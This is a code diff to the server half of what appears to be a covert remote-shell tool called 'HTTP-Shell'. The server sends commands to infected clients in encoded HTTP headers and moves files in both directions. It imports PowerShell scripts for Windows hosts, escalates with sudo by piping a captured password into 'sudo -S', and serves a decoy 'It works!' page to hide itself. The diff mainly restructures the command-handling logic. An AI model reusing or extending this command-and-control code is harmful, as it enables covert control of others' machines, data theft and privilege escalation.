@@ -92,7 +92,6 @@ class MyServer(BaseHTTPRequestHandler):
                         self._set_headers()
                         self.wfile.write(encoded_file.encode("utf-8"))
                         print(colored(f"[+] Uploading {local_path} in {remote_path}..","green"))
-                        cmd_response = True
                 except:
                     print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))
 
@@ -105,7 +104,7 @@ class MyServer(BaseHTTPRequestHandler):
                 path = prompt.split("!")[-1]
                 cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
                 cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
-                old_user = whoami ; comand = None
+                old_user = whoami
 
                 if "\\" in path:
                     slash = "\\"
@@ -118,115 +117,117 @@ class MyServer(BaseHTTPRequestHandler):
                 else:
                     cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
                 cinput += (colored(" ", "yellow"))
-                if cmd_response:  
+
+                if cmd_response:
                     command = input(cinput + "\001\033[0m\002")
                     split_cmd = command.split()
 
-                if command == "" or command == None or not command:
-                    print()
-                
-                if command == "exit":
-                    if root:
-                        whoami = old_user
-                        root = False ; command = None
+                    if command == "" or command == None or not command:
                         print()
-                    else:
-                        print (colored("[!] Exiting..\n", "red"))
-                        exit(0)
-
-                if command == "kill":
-                    command = "exit"
-
-                if command == "clear" or command == "cls":
-                    os.system("clear")
-                    command = None
-
-                if "sudo" in command.split()[0]:
-                    if not ":" in path:
-                        args = oslex.split(command)
-                        if len(args) < 2:
-                            print(colored("[!] Usage: sudo \"command\" or sudo su\n","red"))
-                            command = None
-                        else:
-                            if not sudo:
-                                old_cmd = ' '.join(args[1:])
-                                print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
-                                sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
-                                command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S " + old_cmd)
-                                wait_for_cmd = True ; sudo = True
-                                if "su" in args:
-                                    command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S printf 'HTTPShellNull'")
-                                    root = True
-                            else:
-                                old_cmd = ' '.join(args[1:])
-                                command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
-                                if "su" in args:
-                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S printf 'HTTPShellNull'")
-                                    root = True
-
-                if "upload" in command.split()[0]:
-                    args = oslex.split(command)
-                    if len(args) < 3 or len(args) > 3:
-                        print(colored("[!] Usage: upload \"local_file\" \"remote_file\"\n","red"))
-                        command = None
-                    else:
-                        local_path = args[1]
-                        remote_path = args[2]
-                        command = "upload " + args[1] + "!" + args[2]
-                        
-                if "download" in command.split()[0]:
-                    args = oslex.split(command)
-                    if len(args) < 3 or len(args) > 3:
-                        print(colored("[!] Usage: download \"local_file\" \"remote_file\"\n","red"))
-                        command = None
-                    else:
-                        remote_path = args[1]
-                        local_path = args[2]
-                        command = "download " + args[1] + "!" + args[2]
-                        
-                if "import-ps1" in command.split()[0]:
-                    args = oslex.split(command)
-                    if len(args) < 2 or len(args) > 2:
-                        print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
-                        command = None
-                    else:  
-                        try:
-                            filename = args[1]
-                            with open(filename, "rb") as f:
-                                command = f.read().decode()
-                                print(colored(f"[!] File \"{filename}\" imported successfully!", "green"))
-
-                        except FileNotFoundError:
-                            print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
-                            command = None
-
-                if "help" in command.split()[0]:
-                    print(colored("[+] Available commands:","green"))
-                    print(colored("    upload: Upload a file from local to remote computer","blue"))
-                    print(colored("    download: Download a file from remote to local computer","blue"))
-                    print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
-                    print(colored("    clear/cls: Clear terminal screen","blue"))
-                    print(colored("    kill: Kill client connection","blue"))
-                    print(colored("    exit: Exit from program\n","blue"))
-                    command = None
-
-                if command is not None:
-                    if root and not "cd" in command:
-                        if not wait_for_cmd and not "exit" in command:
-                            old_cmd = command
-                            command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
-
-                    first_run = False
-                    cmd_response = False
-                    encoded_command = "Token: "
-                    encoded_command += self.encode_reversed_base64url(command)
-                    self._set_headers()
-                    self.wfile.write(encoded_command.encode("utf-8"))
                     
                     if command == "exit":
-                        print (colored("[!] Exiting..\n", "red"))
-                        exit(0)
-                
+                        if root:
+                            whoami = old_user
+                            root = False ; command = None
+                            print()
+                        else:
+                            print (colored("[!] Exiting..\n", "red"))
+                            exit(0)
+
+                    if command == "kill":
+                        command = "exit"
+
+                    if command == "clear" or command == "cls":
+                        os.system("clear")
+                        command = None
+
+                    if "sudo" in command.split()[0]:
+                        if not ":" in path:
+                            args = oslex.split(command)
+                            if len(args) < 2:
+                                print(colored("[!] Usage: sudo \"command\" or sudo su\n","red"))
+                                command = None
+                            else:
+                                if not sudo:
+                                    old_cmd = ' '.join(args[1:])
+                                    print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
+                                    sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
+                                    command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S " + old_cmd)
+                                    wait_for_cmd = True ; sudo = True
+                                    if "su" in args:
+                                        command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S printf 'HTTPShellNull'")
+                                        root = True
+                                else:
+                                    old_cmd = ' '.join(args[1:])
+                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
+                                    if "su" in args:
+                                        command = str("printf 'HTTPShellNull'" + " | " + "sudo -S printf 'HTTPShellNull'")
+                                        root = True
+
+                    if "upload" in command.split()[0]:
+                        args = oslex.split(command)
+                        if len(args) < 3 or len(args) > 3:
+                            print(colored("[!] Usage: upload \"local_file\" \"remote_file\"\n","red"))
+                            command = None
+                        else:
+                            local_path = args[1]
+                            remote_path = args[2]
+                            command = "upload " + args[1] + "!" + args[2]
+                            
+                    if "download" in command.split()[0]:
+                        args = oslex.split(command)
+                        if len(args) < 3 or len(args) > 3:
+                            print(colored("[!] Usage: download \"local_file\" \"remote_file\"\n","red"))
+                            command = None
+                        else:
+                            remote_path = args[1]
+                            local_path = args[2]
+                            command = "download " + args[1] + "!" + args[2]
+                            
+                    if "import-ps1" in command.split()[0]:
+                        args = oslex.split(command)
+                        if len(args) < 2 or len(args) > 2:
+                            print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
+                            command = None
+                        else:  
+                            try:
+                                filename = args[1]
+                                with open(filename, "rb") as f:
+                                    command = f.read().decode()
+                                    print(colored(f"[!] File \"{filename}\" imported successfully!", "green"))
+
+                            except FileNotFoundError:
+                                print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
+                                command = None
+
+                    if "help" in command.split()[0]:
+                        print(colored("[+] Available commands:","green"))
+                        print(colored("    upload: Upload a file from local to remote computer","blue"))
+                        print(colored("    download: Download a file from remote to local computer","blue"))
+                        print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
+                        print(colored("    clear/cls: Clear terminal screen","blue"))
+                        print(colored("    kill: Kill client connection","blue"))
+                        print(colored("    exit: Exit from program\n","blue"))
+                        command = None
+
+                    if command is not None:
+                        cmd_response = False
+                        first_run = False
+
+                        if root and not "cd" in command:
+                            if not wait_for_cmd and not "exit" in command:
+                                old_cmd = command
+                                command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
+
+                encoded_command = "Token: "
+                encoded_command += self.encode_reversed_base64url(command)
+                self._set_headers()
+                self.wfile.write(encoded_command.encode("utf-8"))
+
+                if command == "exit":
+                    print (colored("[!] Exiting..\n", "red"))
+                    exit(0)
+
             else:
                 itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                 self.send_response(200)
@@ -237,6 +238,8 @@ class MyServer(BaseHTTPRequestHandler):
 
         except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
             pass
+
+        return first_run, command, wait_for_cmd, sudo, root, cmd_response
 
     def do_POST(self):
         global cmd_response
@@ -268,7 +271,6 @@ class MyServer(BaseHTTPRequestHandler):
                             filename.write(file_content)
                             self.wfile.write(response.encode())
                             print(colored(f"[+] Downloading {remote_path} in {local_path}..","green"))
-                            cmd_response = True
                     except:
                         print(colored(f"[!] Error writing \"{remote_path}\" file!", "red"))
                 else:
@@ -354,6 +356,8 @@ class MyServer(BaseHTTPRequestHandler):
 
         except:
             pass
+
+        return prompt, cmd_response
 
     def log_message(self, format, *args):
             pass
